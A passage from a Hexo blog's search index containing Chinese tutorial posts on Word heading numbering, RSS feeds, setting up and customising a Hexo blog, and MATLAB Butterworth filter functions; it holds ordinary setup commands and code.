      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> VS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word排版 - 章节编号</title>
      <link href="2016/12/28/word-numbering/"/>
      <url>2016/12/28/word-numbering/</url>
      
        <content type="html"><![CDATA[<p>在论文攥写过程中，少不了对文档进行排版，而对章节名称进行编号就是排版中的一环，本文将以Word2016为例进行说明。</p><h2 id="添加标题并设置标题样式"><a href="#添加标题并设置标题样式" class="headerlink" title="添加标题并设置标题样式"></a>添加标题并设置标题样式</h2><p>在word文档中添加好标题，然后对各个标题按层级顺序设置好对应的标题样式。</p><p><img src="/assets/word/numbering/addTitle.png" alt="addTitle"></p><h2 id="选择默认的多级列表样式"><a href="#选择默认的多级列表样式" class="headerlink" title="选择默认的多级列表样式"></a>选择默认的多级列表样式</h2><p>在菜单栏的“开始”选项卡中选择如下所示的多级列表，单击选中后点击底部的“定义新的多级列表”</p><p><img src="/assets/word/numbering/selectType.png" alt="selectType"></p><h2 id="定义新的多级列表"><a href="#定义新的多级列表" class="headerlink" title="定义新的多级列表"></a>定义新的多级列表</h2><p>在弹出的设置界面中点击“更多”，然后依次设置三层标题样式</p><h3 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h3><p>在编号格式中添加前缀和后缀，在后面添加两个空格，取消制表符，并将文本缩进位置设为0厘米，最后将该样式链接到 “标题1”。</p><p><img src="/assets/word/numbering/type1.png" alt="type1"></p><h3 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h3><p>与一级标题不同的是，二级标题需要勾选右下方的 “正规形式编号”。</p><p><img src="/assets/word/numbering/type2.png" alt="type2"></p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>三级标题和二级标题的样式类似，照着来一遍就行。</p><p><img src="/assets/word/numbering/type3.png" alt="type3"></p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p>点击确定以后，便可以看到所有标题都已经按给定格式添加好了编号。</p><p><img src="/assets/word/numbering/effect.png" alt="effect"></p><p>Notes：</p><ol><li>由于有的一级标题可能不需要编号，如<strong>参考文献</strong>，所以可以在设计多级列表时把右上角的 “将级别链接到样式” 选为 “(无样式)”，设置好后。对于需要编号的一级标题，可以手动选择标题后选择该多级列表样式。</li><li>注意千万不要在设置编号的时候把默认的数字1删掉，即使自己后来再重新写上也不行，因为默认给定的数字都具有自动编号功能，自己手动加上的将视为固定字符而无法完成自动编号。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂物柜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
            <tag> word </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSS简介</title>
      <link href="2016/12/26/RSS-descr/"/>
      <url>2016/12/26/RSS-descr/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>之前看到好多网站都有下面这个图标，然后点进去就出来个<code>xml</code>文件，一直不明白这个是干什么的，后来自己使用<code>jekyll</code>创建博客，发现自动生成了一个<code>feed.xml</code>，也不明白这是干啥的。</p><p><img src="/assets/rss/rss.jpg" alt="RSS logo"></p><p>直到近日使用<code>Hexo</code>创建博客，又遇到<code>RSS</code>配置问题，这才决定一探究竟。经过搜索，知道 <code>RSS</code> (Really Simple Syndication, 简易信息聚合)是一种基于<code>XML</code>标准，广泛用于互联网的内容包装和投递协议。</p><p>而前面所说的<code>feed.xml</code>就是一个<code>RSS</code>文件，当我们把rss文件通过链接形式放在自己的博客网站上后，其他人就能通过这个链接订阅自己的博客了。</p><p>在这个信息爆炸的时代，使用RSS订阅能更快速地获取自己想要关注的信息，避免浪费大量时间在网络上漫无目的的瞎逛。</p><h2 id="RSS源"><a href="#RSS源" class="headerlink" title="RSS源"></a>RSS源</h2><p>了解了什么是<code>rss</code>后，我们需要知道的就是如果获取RSS资源，现在的大部分新闻网站和博客网站都提供了RSS订阅功能。如何分辨一个网站是否支持RSS订阅功能，目前我所知道的方法包括：</p><ol><li>查找网站中的 RSS logo</li><li>标注了 “RSS” 文字的地方</li><li>标注了 “订阅” 相关的链接</li></ol><p>嫌麻烦，当然可以找别人已经总结好的订阅源：</p><ol><li><a href="https://www.zhihu.com/question/19580096">知乎-你必读的 RSS 订阅源有哪些？</a></li><li><a href="https://www.zhihu.com/question/19564031">哪些 RSS 值得订阅到阅读器？</a></li><li>本站点博客：<a href="http://www.litreily.top/atom.xml">http://www.litreily.top/atom.xml</a></li><li>本人的Lofter博客：<a href="http://litreily.lofter.com/rss">http://litreily.lofter.com/rss</a></li></ol><p>下面这些是我目前订阅的一些资源：</p><ol><li>知乎日报：<a href="http://feeds.feedburner.com/zhihu-daily">http://feeds.feedburner.com/zhihu-daily</a></li><li>知乎每日精选：<a href="https://www.zhihu.com/rss">https://www.zhihu.com/rss</a></li><li>月光博客：<a href="http://feed.williamlong.info/">http://feed.williamlong.info/</a></li><li>优设-UISDC：<a href="http://www.uisdc.com/feed">http://www.uisdc.com/feed</a></li><li>异次元软件世界：<a href="http://feed.iplaysoft.com/">http://feed.iplaysoft.com/</a></li><li>天涯小筑：<a href="http://tvfantasy.net/feed/">http://tvfantasy.net/feed/</a></li><li>阮一峰的网络日志：<a href="http://www.ruanyifeng.com/blog/atom.xml">http://www.ruanyifeng.com/blog/atom.xml</a></li><li>极客公园：<a href="http://www.geekpark.net/rss">http://www.geekpark.net/rss</a></li><li>极客范：<a href="http://www.geekfan.net/feed/">http://www.geekfan.net/feed/</a></li><li>互联网的那些事：<a href="http://www.alibuybuy.com/feed">http://www.alibuybuy.com/feed</a></li></ol><h2 id="RSS阅读器"><a href="#RSS阅读器" class="headerlink" title="RSS阅读器"></a>RSS阅读器</h2><p>有了RSS资源，该用什么工具查看呢，这个通常分在线和离线两种。</p><ul><li><p>在线网站：<a href="http://reader.youdao.com/">有道阅读</a>，<a href="http://www.yilan.io/">一览</a> ...</p></li><li><p>离线软件：<a href="http://www.feeddemon.com/">FeedDemon</a>，<a href="http://www.appinn.com/inoreader/">inoreader</a> ...</p></li></ul><p>更详细的可以看这篇：<a href="https://www.zhihu.com/question/28808592">2015 国内最好的 RSS 阅读器是什么？</a></p><h3 id="FeedDemon"><a href="#FeedDemon" class="headerlink" title="FeedDemon"></a>FeedDemon</h3><p>最后简单讲讲我现在用的离线软件 —— FeedDemon，用法极为简单，打开软件后使用快捷键 <code>Ctrl+N</code> 打开 <code>Subscrobe</code> 添加界面，输入rss文件链接后点击两次<code>next</code>即可。</p><p><img src="/assets/rss/feedDemon-addsite.png" alt="feedDemon-addSite"></p><p>下面这是我的订阅情况</p><p><img src="/assets/rss/feedDemon-sites.png" alt="feedDemon-sites"></p><p>Notes:</p><ol><li>如果当前页没有感兴趣的文章，可以使用快捷键 <code>Ctrl+D</code> 直接将整页设为“已读”，并自动跳至下一页或下一个订阅源。</li><li>该软件包含三种列表模式：标题、摘要和全文</li><li>该软件包含三种排序依据：订阅源、时间和标题</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSS </tag>
            
            <tag> Feed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站日志</title>
      <link href="2016/12/12/blog-log/"/>
      <url>2016/12/12/blog-log/</url>
      
        <content type="html"><![CDATA[<p>使用 <code>hexo</code> 建站后，改用了新的主题，但存在许多问题，后续将不断修复更新，本文将记录主要的更新内容。</p><h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p>在使用 <a href="https://github.com/yumemor/hexo-theme-primer">primer</a> 主题之前，我使用 <code>jekyll</code> 建站，配合 <code>coding-pages</code> 服务部署网站，站点所有样式均为自定义。</p><h3 id="Infomation"><a href="#Infomation" class="headerlink" title="Infomation"></a>Infomation</h3><ul><li><code>jekyll</code> + <code>coding-pages</code> 建站</li><li><code>url</code>: <a href="http://www.litreily.top/">www.litreily.top</a></li><li>评论系统：<code>disqus</code> | 友言</li><li>统计服务：<a href="http://tongji.baidu.com/">百度统计</a></li></ul><h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><p><img src="/assets/log/jekyll_home.png" alt="jekyll-homepage"></p><p><img src="/assets/log/jekyll_blog.png" alt="jekyll-blogpage"></p><p><img src="/assets/log/jekyll_category.png" alt="jekyll-category"></p><p><img src="/assets/log/jekyll_about.png" alt="jekyll-about"></p><h2 id="2016-12-11"><a href="#2016-12-11" class="headerlink" title="2016-12-11"></a>2016-12-11</h2><p>经好友 <a href="https://www.smslit.top/">smslit</a> 推荐，使用 <code>hexo</code> 主题建站，纠结许久后决定使用 <code>primer</code> 主题，并根据个人需求进行定制和优化。好了，下面对建站过程进行简要介绍。</p><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><ul><li>安装 <code>hexo</code></li></ul><p>在确保安装好 <a href="https://nodejs.org/en/">node.js</a> 以及 <a href="https://git-scm.com/downloads">git</a> 的情况下执行以下指令</p><pre><code class="bash">npm install hexo-cli -ghexo init hexoBlogcd hexoBlognpm install</code></pre><p><code>hexo</code>系统默认下载主题 <a href="https://github.com/hexojs/hexo-theme-landscape">landscape</a> ，折腾了一小会觉得除了代码高亮不错外，其它样式略显一般，所以直接放弃，改用 <a href="https://github.com/yumemor/hexo-theme-primer">primer</a>。</p><ul><li>下载 <code>primer</code></li></ul><p>在 <code>hexoBlog\themes</code> 目录下克隆主题</p><pre><code class="bash">git clone https://github.com/yumemor/hexo-theme-primer.git</code></pre><ul><li>新建 <code>github</code> 远程仓库</li></ul><p>为了使用 <code>github pages</code> ,需要将仓库名称设为 <code>[username].github.io</code> ，后续配置 <code>_config.yml</code> 时，需要将 <code>deploy</code> 的属性 <code>repo</code> 设为该仓库目录。</p><ul><li>安装插件</li></ul><p>为了使用 <code>hexo</code> 的发布功能、站内搜索等功能，需要安装以下插件</p><pre><code class="bash">npm install hexo-server --savenpm install hexo-renderer-less --savenpm install hexo-generator-feed --savenpm install hexo-generator-search --save</code></pre><h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><ul><li>修改 <strong>根目录</strong> 下的 <code>_config.yml</code></li></ul><pre><code class="YAML"># Sitetitle: LITREILYsubtitle: simple lifedescription: Stay Hungry, Stay Foolishauthor: litreilylanguage: defaultemail: 707922098@qq.com# URLurl: www.litreily.top/# Writing## transplant from jekyll system which post-name write  with date## so it&#39;s needed to change the name of new postsnew_post_name: :year-:month-:day-:title.markdown# Pagination## Set per_page to 0 to disable paginationper_page: 8pagination_dir: page# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: primer# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:  type: git  repo: git@github.com:Litreily/Litreily.github.io.git  branch: master# Searchsearch:  path: search.xml  field: post</code></pre><ul><li>修改 <strong>主题目录</strong> 下的 <code>_config.yml</code></li></ul><pre><code class="YAML">menus:    -        name: 首页        link: /    -        name: 分类        link: categories/    -        name: 开源项目        link: open-source/    -        name: 留言板        link: message/# Profileprofile:    location: QingDao, China    github: litreily    organization: upc# Githubgithub:  username: litreily  popular_repos: [hexoBlogProject,jekyllBlog,Student]# Commentsyouyan_username: litreilyduoshuo_username: litreily # 多说配置#disqus_username: litreily # disqus 配置# Search## google | localsearch:    use: local</code></pre><h3 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h3><ul><li><p>将 <code>jekyll</code> 系统中的博客复制到文件夹 <code>/source/_posts</code> 中</p></li><li><p>发布博客</p></li></ul><pre><code class="bash">hexo cleanhexo generatehexo deploy</code></pre><ul><li>本地服务器</li></ul><pre><code class="bash">hexo serve</code></pre><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><ul><li>解决代码高亮不正常问题</li></ul><p>由于 <code>primer</code>主题自带高亮样式，所以需要将原有样式禁用，修改 <strong>根目录</strong> 下的 <code>_config.yml</code> 文件</p><pre><code class="YAML">highlight:  enable: false  line_number: false  auto_detect: false  tab_replace:</code></pre><ul><li>解决首页显示全部博文问题</li></ul><p>首次使用 <code>primer</code> 主题，成功发布后发现主页博客列表显示了整个博文内容，而非摘要，后来查找主题文件发现原主人使用了 <code>excerpt</code> 变量，而我原先使用的均是 <code>description</code> ，所以将主题文件 <code>primer\layout\_partial\article.ejs</code> 中的 <code>excerpt</code> 替换为 <code>description</code> 后便可以了。</p><ul><li>解决留言板样式不正常问题</li></ul><p>首先需要说明的是， <code>primer</code> 主题自带 <strong>首页</strong>、<strong>分类</strong> 、 <strong>开源项目</strong> 和 <strong>留言板</strong> 4个页面，当然在使用时，需要通过</p><pre><code class="bash">hexo new page categorieshexo new page open-sourcehexo new page message</code></pre><p>创建好除首页外的其它三个页面后，因为主题中都有 <code>layout</code> 文件 <code>categories.ejs</code> 与 <code>open.ejs</code>与之对应，所以<code>category</code> 和 <code>open-source</code> 都能够正常显示。</p><p>而 <code>message</code> 页面并没有，它默认使用 <code>layout:page</code> ，导致页面中保留了目录栏和分享栏，而这并不是我想要的，所以我在 <code>primer\layout\_partial\</code> 中添加 <code>message.ejs</code> 文件，在 <code>article-post.ejs</code> 文件基础上删除了多余项。</p><p>最后在 <code>primer\layout\</code> 中添加 <code>message.ejs</code>（与<code>_partial</code>文件夹中的不同）文件，写入以下内容即可。</p><pre><code class="html">&lt;body&gt;    &lt;%- partial(&#39;_partial/header&#39;) %&gt;    &lt;%- partial(&#39;_partial/banner-post&#39;,&#123;post: page,index: true&#125;) %&gt;    &lt;%- partial(&#39;_partial/message&#39;,&#123;post: page,index: false&#125;) %&gt;</code></pre><ul><li>categories 与 tags</li></ul><p>在 <code>jekyll</code> 中，分类与标签基本是一个概念，但在 <code>hexo</code> 却截然不同， <code>categories</code> 有级别之分（按先后顺序分级），而 <code>tags</code> 并没有。所以需要将原有博客重新归类并设置标签。</p><h2 id="2016-12-12"><a href="#2016-12-12" class="headerlink" title="2016-12-12"></a>2016-12-12</h2><ul><li>将评论系统改为 <a href="http://duoshuo.com/">多说</a></li><li>将原有博文的 <code>h4</code> 标题统一改为 <code>h3</code></li><li>添加博文 &quot;建站日志&quot; ，用以记录网站建设过程</li><li>将博客部署到域名 <code>www.litreily.top</code></li><li>修改 <code>primer\layout\_partial\footer.ejs</code> ，配置 <code>RSS</code> 路径，将 <code>atom.xml</code> 改为 <code>search.xml</code>。</li></ul><h2 id="2016-12-14"><a href="#2016-12-14" class="headerlink" title="2016-12-14"></a>2016-12-14</h2><ul><li>用PS手绘字母 <code>L</code> ，修改网站logo</li><li>修复了博文中所有引用 <code>&gt;</code> 显示异常的问题</li><li>修复了博文中图片错位的问题</li><li>修改了 <code>footer</code> 中的主题链接，已修改为 <a href="https://github.com/Litreily/hexo-theme-primer">https://github.com/Litreily/hexo-theme-primer</a></li></ul><h2 id="2016-12-15"><a href="#2016-12-15" class="headerlink" title="2016-12-15"></a>2016-12-15</h2><ul><li>对部分博文重新分类，减少 <code>categories</code> 数量</li><li>将分类页面的标签栏 <code>Blog Tags</code> 换为分类栏 <code>Blog Categories</code>，并给所有类型添加链接</li><li>去除留言板页面中标题下方的时间显示</li><li>在 <code>css/_partial/article.styl</code> 中添加了 <code>pre.descriptions</code> 样式</li></ul><pre><code class="css">pre.descriptions    font-size: 14px !important;    border-left: 3px solid #4996D1;    border-radius: 0 !important;    background-color: rgba(255,255,255,0) !important;    margin-left: 2em;</code></pre><p>示例</p><hr><pre><code class="html">&lt;pre class=&quot;descriptions&quot;&gt;1. step12. step23. step3&lt;/pre&gt;</code></pre><ul><li>针对特定博文添加了两个标签样式 <code>tagBlack</code> &amp; <code>tagGrey</code></li></ul><pre><code class="css">.tagBlack a, .tagGrey a&#123;    text-decoration: none !important;    transition: background-color .2s ease;    padding: .4em .6em;    margin: 0 3px 3px 0;    line-height: 1;    white-space: nowrap;    font-size: 12px;    border: 1px solid transparent;    display: inline-block;    border-radius: 4px;&#125;.tagBlack a&#123;    color: #FFF;    background-color: #2f3337;    &amp;:hover&#123;        color: #FFF;        background-color: #0C0D0E;    &#125;&#125;.tagGrey a&#123;    color: #535a60;    background-color: #eff0f1;    border-color: #d6d9dc;    &amp;:hover&#123;        color: #535a60;        background-color: #D6D9DC;    &#125;&#125;</code></pre><p>示例</p><pre><code class="html">&lt;div class=&quot;tagBlack&quot;&gt;&lt;a href=&quot;http://www.mymmqm.com/&quot;&gt;莫明棋妙&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;tagGrey&quot;&gt;&lt;a href=&quot;http://www.xiami.com/artist/68934&quot;&gt;河图&lt;/a&gt;&lt;/div&gt;</code></pre><ul><li>在菜单栏加入 <code>标签</code> 项，并在标签页内中加入 <code>标签云</code></li></ul><pre><code class="txt">tags.ejs: 标签云界面tag.ejs:  单个标签页，显示某标签内的博客列表，并在侧边显示带有链接的标签栏</code></pre><ul><li><p>修改 <code>search.js</code> 与 <code>search-local-js.ejs</code> ，在搜索后的路径中添加 <code>http://</code> , p修复搜索框链接出错问题</p></li><li><p>在 <code>themes\primer\source</code> 中添加文件 <code>CNAME</code>，添加域名</p></li></ul><pre><code class="yml">www.litreily.top</code></pre><h2 id="2016-12-23"><a href="#2016-12-23" class="headerlink" title="2016-12-23"></a>2016-12-23</h2><ul><li>修复RSS，将主题中的 <code>footer.ejs</code> ，将 <code>search</code> 改为 <code>atom</code></li></ul><pre><code class="html">&lt;a href=&quot;/atom.xml&quot;&gt;</code></pre><p>当然，让博客成功生成 <code>atom.xml</code> 的前提是安装好 <code>feed</code> 生成插件</p><pre><code class="bash">npm install hexo-generate-feed --save</code></pre><ul><li>参考<a href="http://ibruce.info/2015/04/04/busuanzi/">不蒜子</a>，添加站点流量统计服务</li></ul><p>在 <code>head</code> 中导入所需的 <code>js</code> 文件：</p><pre><code class="html">&lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code></pre><p>并在 <code>banner.ejs</code> 添加两个标签：</p><pre><code class="html">&lt;span class=&quot;meta-info&quot;&gt;    &lt;span class=&quot;octicon octicon-pulse&quot;&gt;&lt;/span&gt;    &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;meta-info&quot;&gt;    &lt;span class=&quot;octicon octicon-flame&quot;&gt;&lt;/span&gt;    &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;&lt;/span&gt;</code></pre><ul><li>添加百度统计服务</li></ul><p>在<a href="http://tongji.baidu.com/">百度统计</a>中添加好站点，根据提示获取统计代码</p><pre><code class="html">&lt;script&gt;    var _hmt = _hmt || [];    (function() &#123;    var hm = document.createElement(&quot;script&quot;);    hm.src = &quot;https://hm.baidu.com/hm.js?d34587ee0aac7488b7dd789f9f17f366&quot;;    var s = document.getElementsByTagName(&quot;script&quot;)[0];    s.parentNode.insertBefore(hm, s);    &#125;)();&lt;/script&gt;</code></pre><p>在 <code>head.ejs</code> 中的 <code>&lt;/head&gt;</code> 前添加以上代码，往后便可在百度统计中查看站点的详细信息啦。</p><h2 id="2016-12-24"><a href="#2016-12-24" class="headerlink" title="2016-12-24"></a>2016-12-24</h2><ul><li>修复RSS无法被正常获取资源的问题</li></ul><p>今天用 <code>FeedDemon</code> 获取本站点的 <code>RSS</code> 资源，发现能够得到列表，但点击链接后发现多了一个站点根目录的前缀，后来发现是自己的根目录设置有问题。于是我修改了站点配置文件<code>_config.yml</code>，加上前缀<code>http://</code>就ok了。</p><pre><code class="YAML">url: http://www.litreily.top/root: /</code></pre><p>但是修改以后发现搜索功能又出问题了，这才意识到原来修改 <code>search.js</code> 与 <code>search-local-js.ejs</code> 才是多此一举，原来的问题同样出在这个<code>url</code>，所以只能又将这两个文件的 <code>http://</code> 去掉了。</p><h2 id="2017-04-29"><a href="#2017-04-29" class="headerlink" title="2017-04-29"></a>2017-04-29</h2><ul><li>更换新主题 <a href="https://github.com/tufu9441/maupassant-hexo">maupassant</a>，大道至简</li><li>解决代码高亮不正常问题</li><li>替换搜索引擎至本地搜索</li></ul><h2 id="2017-04-30"><a href="#2017-04-30" class="headerlink" title="2017-04-30"></a>2017-04-30</h2><ul><li>更新主题样式，修复部分文章显示异常的问题</li><li>更新标签云样式</li></ul><h2 id="2017-05-01"><a href="#2017-05-01" class="headerlink" title="2017-05-01"></a>2017-05-01</h2><ul><li>在About页面添加联系方式和一句简短的介绍</li><li>在菜单中添加了gitbook笔记的接口</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><ul><li>国际域名网：<a href="http://www.yuming.top/">http://www.yuming.top/</a></li></ul><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><ul><li><code>hexo</code>帮助文档：<a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></li><li><code>primer</code>主题：<a href="https://github.com/yumemor/hexo-theme-primer">https://github.com/yumemor/hexo-theme-primer</a></li><li><code>hexo</code>搭建<code>Github-Pages</code>博客填坑教程：<a href="http://www.jianshu.com/p/35e197cb1273">http://www.jianshu.com/p/35e197cb1273</a></li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li><strong>不蒜子</strong>站点统计：<a href="http://ibruce.info/2015/04/04/busuanzi/">http://ibruce.info/2015/04/04/busuanzi/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂物柜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> hexo </tag>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to hexo</title>
      <link href="2016/12/10/hello-hexo/"/>
      <url>2016/12/10/hello-hexo/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post-named-new-post"><a href="#Create-a-new-post-named-new-post" class="headerlink" title="Create a new post named new post"></a>Create a new post named new post</h3><pre><code class="bash">hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab - 常用函数集锦</title>
      <link href="2016/12/09/matlab-Funcs/"/>
      <url>2016/12/09/matlab-Funcs/</url>
      
        <content type="html"><![CDATA[<p>在使用matlab进行信号处理和图形绘制过程中，某些函数被频繁调用，所以有必要将这些常用函数进行总结归类。</p><h2 id="滤波函数"><a href="#滤波函数" class="headerlink" title="滤波函数"></a>滤波函数</h2><h3 id="低通滤波"><a href="#低通滤波" class="headerlink" title="低通滤波"></a>低通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=lopass_butterworth(inputsignal,cutoff_freq,Fs,order)% Low-pass Butterworth filter% [filtered_signal,filtb,filta] = lopass_butterworth(inputsignal,cutoff_freq,Fs,order)%% This is simply a set of built-in Matlab functions, repackaged for ease of% use by Chad Greene, October 2012.%% INPUTS:% inputsignal = input time series% cutoff_freq = filter corner frequency% Fs = data sampling frequency% order = order of Butterworth filter%  % OUTPUTS:% filtered_signal = the filtered time series% filtb, filta = filter numerator and denominator (optional)%% EXAMPLE 1:% load train% t = (1:length(y))/Fs;% y_filt = lopass_butterworth(y,900,Fs,4); % cut off at 900 Hz% figure% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)% xlabel(&#39;time in seconds&#39;)% box off% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)% sound(y,Fs)      % play original time series% pause(2)         % pause two seconds% sound(y_filt,Fs) % play filtered time seriesnyquist_freq = Fs/2;  % Nyquist frequencyWn=cutoff_freq/nyquist_freq;    % non-dimensional frequency[filtb,filta]=butter(order,Wn,&#39;low&#39;); % construct the filterfiltered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase</code></pre><h3 id="高通滤波"><a href="#高通滤波" class="headerlink" title="高通滤波"></a>高通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=hipass_butterworth(inputsignal,cutoff_freq,Fs,order)% High-pass Butterworth filter% [filtered_signal,filtb,filta] = hipass_butterworth(inputsignal,cutoff_freq,Fs,order)%% This is simply a set of built-in Matlab functions, repackaged for ease of% use by Chad Greene, October 2012.%% INPUTS:% inputsignal = input time series% cutoff_freq = filter corner frequency% Fs = data sampling frequency% order = order of Butterworth filter%% OUTPUTS:% filtered_signal = the filtered time series% filtb, filta = filter numerator and denominator (optional)%% EXAMPLE 1:% load train% t = (1:length(y))/Fs;% y_filt = hipass_butterworth(y,900,Fs,4); % cut off at 900 Hz% figure% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)% xlabel(&#39;time in seconds&#39;)% box off% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)% sound(y,Fs)      % play original time series% pause(2)         % pause two seconds% sound(y_filt,Fs) % play filtered time seriesnyquist_freq = Fs/2;  % Nyquist frequencyWn=cutoff_freq/nyquist_freq;    % non-dimensional frequency[filtb,filta]=butter(order,Wn,&#39;high&#39;); % construct the filterfiltered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase</code></pre><h3 id="带通滤波"><a href="#带通滤波" class="headerlink" title="带通滤波"></a>带通滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandpass_butterworth(inputsignal,cutoff_freqs,Fs,order)% Bandpass Butterworth filter% [filtered_signal,filtb,filta] = bandpass_butterworth(inputsignal,cutoff_freq,Fs,order)%% This is simply a set of built-in Matlab functions, repackaged for ease of% use by Chad Greene, October 2012.%% INPUTS:% inputsignal = input time series% cutoff_freqs = filter corner frequencies in the form [f1 f2]% Fs = data sampling frequency% order = order of Butterworth filter%% OUTPUTS:% filtered_signal = the filtered time series% filtb, filta = filter numerator and denominator (optional)%% EXAMPLE 1:% load train% t = (1:length(y))/Fs;% y_filt = bandpass_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz%% figure% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)% xlabel(&#39;time in seconds&#39;)% box off% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)% sound(y,Fs)      % play original time series% pause(2)         % pause two seconds% sound(y_filt,Fs) % play filtered time seriesnyquist_freq = Fs/2;  % Nyquist frequencyWn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency[filtb,filta]=butter(order,Wn,&#39;bandpass&#39;); % construct the filterfiltered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase</code></pre><h3 id="带阻滤波"><a href="#带阻滤波" class="headerlink" title="带阻滤波"></a>带阻滤波</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)% Band-stop Butterworth filter% [filtered_signal,filtb,filta] = bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)%% This is simply a set of built-in Matlab functions, repackaged for ease of% use by Chad Greene, October 2012.%% INPUTS:% inputsignal = input time series% cutoff_freqs = filter corner frequencies in the form [f1 f2]% Fs = data sampling frequency% order = order of Butterworth filter%% OUTPUTS:% filtered_signal = the filtered time series% filtb, filta = filter numerator and denominator (optional)%% EXAMPLE 1:% load train% t = (1:length(y))/Fs;% y_filt = bandstop_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz%% figure% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)% xlabel(&#39;time in seconds&#39;)% box off% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)% sound(y,Fs)      % play original time series% pause(2)         % pause two seconds% sound(y_filt,Fs) % play filtered time seriesnyquist_freq = Fs/2;  % Nyquist frequencyWn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency[filtb,filta]=butter(order,Wn,&#39;stop&#39;); % construct the filterfiltered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase</code></pre><h2 id="绘图函数"><a href="#绘图函数" class="headerlink" title="绘图函数"></a>绘图函数</h2><pre><code class="matlab">function [  ] = setPlot( varargin )% setPlot()% setPlot(title)% setPlot(title,xlabel)% setPlot(title,xlable,ylabel)% setPlot(title,xlabel,ylabel,xlim)% setPlot(title,xlable,ylabel,xlim,ylim)narginchk(0,5);     % 判断输入参数是否足够grid on;axis tight;if nargin&gt;=1    title(varargin&#123;1&#125;);endif nargin&gt;=2    xlabel(varargin&#123;2&#125;);endif 